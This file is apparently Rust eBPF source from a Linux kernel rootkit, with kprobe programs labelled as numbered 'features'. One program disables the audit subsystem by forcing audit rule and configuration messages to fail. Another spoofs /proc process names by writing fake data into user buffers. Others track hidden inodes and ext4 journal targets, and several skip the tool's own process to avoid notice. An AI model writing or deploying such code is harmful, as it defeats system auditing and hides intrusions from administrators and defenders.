use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_write_user,
    },
    macros::kprobe,
    programs::ProbeContext,
    EbpfContext,
};
use common::{
    EventHeader, EVENT_AUDIT_KILLED, EVENT_INODE_SLACK_HIDE, EVENT_JOURNAL_MANIPULATED,
    EVENT_PROC_DEEP_SPOOF,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 41: Audit Subsystem Kill (Netlink Level)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_audit_receive_msg(ctx: ProbeContext) -> u32 {
    try_audit_receive_msg(&ctx).unwrap_or_default()
}

fn try_audit_receive_msg(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { AUDIT_KILL_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let skb_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let nlh_ptr: u64 = unsafe { bpf_probe_read_kernel((skb_ptr + 208) as *const u64)? };
    let msg_type: u16 = unsafe { bpf_probe_read_kernel((nlh_ptr + 4) as *const u16)? };

    const AUDIT_SET: u16 = 1001;
    const AUDIT_ADD_RULE: u16 = 1011;

    if msg_type == AUDIT_SET || msg_type == AUDIT_ADD_RULE {
        #[cfg(target_arch = "bpf")]
        unsafe {
            let _ =
                aya_ebpf::helpers::gen::bpf_override_return(ctx.as_ptr() as *mut _, (-1i64) as u64);
        }

        let event = EventHeader {
            event_type: EVENT_AUDIT_KILLED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: msg_type as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 42: Inode Slack-Space Hiding
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_vfs_write_slack(ctx: ProbeContext) -> u32 {
    try_vfs_write_slack(&ctx).unwrap_or_default()
}

fn try_vfs_write_slack(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let inode_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 32) as *const u64)? };
    let ino: u64 = unsafe { bpf_probe_read_kernel((inode_ptr + 64) as *const u64)? };

    if let Some(_entry) = unsafe { SLACK_HIDE_INODES.get(&ino) } {
        let event = EventHeader {
            event_type: EVENT_INODE_SLACK_HIDE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ino,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 43: Ext4 Journal Manipulation
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_journal_commit(ctx: ProbeContext) -> u32 {
    try_journal_commit(&ctx).unwrap_or_default()
}

fn try_journal_commit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let journal_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let j_dev_ino: u64 = unsafe { bpf_probe_read_kernel((journal_ptr + 24) as *const u64)? };

    if unsafe { JOURNAL_TARGETS.get(&j_dev_ino) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_JOURNAL_MANIPULATED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: j_dev_ino,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 44: /proc Deep Spoofing (seq_read hooking)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_seq_read_enter(ctx: ProbeContext) -> u32 {
    try_seq_read_enter(&ctx).unwrap_or_default()
}

fn try_seq_read_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let dentry_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 24) as *const u64)? };
    let parent_ptr: u64 = unsafe { bpf_probe_read_kernel((dentry_ptr + 24) as *const u64)? };
    let _parent_inode_ptr: u64 = unsafe { bpf_probe_read_kernel((parent_ptr + 48) as *const u64)? };

    let name_ptr: u64 = unsafe { bpf_probe_read_kernel((parent_ptr + 40) as *const u64)? };
    let first_char: u8 = unsafe { bpf_probe_read_kernel(name_ptr as *const u8)? };

    if !first_char.is_ascii_digit() {
        return Ok(0);
    }

    let mut target_pid_buf = [0u8; 8];
    let mut digits: u32 = 0;
    for i in 0..7u64 {
        let c: u8 = unsafe { bpf_probe_read_kernel((name_ptr + i) as *const u8)? };
        if !c.is_ascii_digit() {
            break;
        }
        target_pid_buf[i as usize] = c;
        digits += 1;
    }

    if digits == 0 {
        return Ok(0);
    }

    let mut target_pid: u32 = 0;
    for i in 0..digits {
        target_pid = target_pid * 10 + (target_pid_buf[i as usize] - b'0') as u32;
    }

    if let Some(spoof_entry) = unsafe { PROC_SPOOF_PIDS.get(&target_pid) } {
        let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
        unsafe {
            let _ = bpf_probe_write_user(
                buf_ptr as *mut [u8; 16],
                &spoof_entry.fake_comm as *const [u8; 16],
            );
        }

        let event = EventHeader {
            event_type: EVENT_PROC_DEEP_SPOOF,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: target_pid as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
